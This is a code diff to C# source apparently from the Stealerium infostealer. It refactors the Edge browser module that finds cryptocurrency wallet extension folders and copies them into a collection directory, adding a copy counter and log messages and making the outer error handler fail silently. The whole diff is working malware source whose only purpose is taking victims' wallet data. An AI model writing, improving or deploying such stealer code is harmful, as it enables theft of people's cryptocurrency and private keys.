@@ -75,24 +75,55 @@ namespace Stealerium.Target.Browsers.Edge
         {
             try
             {
-                Directory.CreateDirectory(sSaveDir);
+                int walletsCopied = 0;
 
-                foreach (var array in EdgeWalletsDirectories) CopyWalletFromDirectoryTo(sSaveDir, array[1], array[0]);
-                if (Counter.BrowserWallets == 0) Filemanager.RecursiveDelete(sSaveDir);
+                foreach (var array in EdgeWalletsDirectories)
+                {
+                    walletsCopied += CopyWalletFromDirectoryTo(sSaveDir, array[1], array[0]) ? 1 : 0;
+                }
+
+                // If no wallets were copied, delete the save directory if it exists
+                if (walletsCopied == 0)
+                {
+                    Filemanager.RecursiveDelete(sSaveDir);
+                    Logging.Log("No wallets found in Edge extensions.");
+                }
             }
-            catch (Exception ex)
+            catch (Exception)
             {
-                Logging.Log("Edge Browser Wallets >> Failed to collect wallets from Edge browser\n" + ex);
+                //
             }
         }
 
         // Copy wallet files to directory
-        private static void CopyWalletFromDirectoryTo(string sSaveDir, string sWalletDir, string sWalletName)
+        private static bool CopyWalletFromDirectoryTo(string saveDirectory, string walletDirectory, string walletName)
         {
-            var sdir = Path.Combine(sSaveDir, sWalletName);
-            if (!Directory.Exists(sWalletDir)) return;
-            Filemanager.CopyDirectory(sWalletDir, sdir);
-            Counter.BrowserWallets++;
+            try
+            {
+                if (!Directory.Exists(walletDirectory))
+                {
+                    return false;
+                }
+
+                // Create saveDirectory if it doesn't exist
+                if (!Directory.Exists(saveDirectory))
+                {
+                    Directory.CreateDirectory(saveDirectory);
+                }
+
+                var destinationDirectory = Path.Combine(saveDirectory, walletName);
+                Directory.CreateDirectory(destinationDirectory);
+                Filemanager.CopyDirectory(walletDirectory, destinationDirectory);
+                Counter.BrowserWallets++;
+
+                Logging.Log($"Copied wallet: {walletName} to {destinationDirectory}");
+                return true;
+            }
+            catch (Exception ex)
+            {
+                Logging.Log($"Error copying wallet {walletName}: {ex.Message}");
+                return false;
+            }
         }
     }
 }
